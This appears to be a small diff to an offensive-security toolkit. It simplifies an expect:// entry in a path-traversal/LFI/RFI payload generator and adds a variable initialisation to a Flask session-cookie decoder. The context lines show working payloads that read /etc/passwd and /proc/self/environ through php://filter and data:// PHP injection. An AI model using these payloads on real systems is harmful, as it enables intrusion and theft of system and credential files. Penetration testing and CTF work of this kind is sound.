@@ -445,7 +445,7 @@ def path_traversal_payloads(depth: int = 5, target_file: str = "/etc/passwd") ->
         f"file:///proc/self/environ",
         f"php://filter/convert.base64-encode/resource={target_file.lstrip('/')}",
         f"data://text/plain,<?php echo file_get_contents('{target_file.lstrip('/')}'); ?>",
-        f"expect://{command if 'command' in path_traversal_payloads.__code__.co_varnames else 'id'}",
+        "expect://id",
     ]
     return f"Path Traversal / LFI / RFI ({len(payloads)} payloads):\n" + "\n".join(payloads)
 
@@ -722,6 +722,7 @@ def flask_session(session_cookie: str, secret: str = "", action: str = "decode",
         ts = ""
     else:
         return "ERROR: not a Flask cookie (expected base64[.timestamp].signature)"
+    payload = b""
     try:
         payload = _decode_payload(data_b64)
         parsed = json.loads(payload)
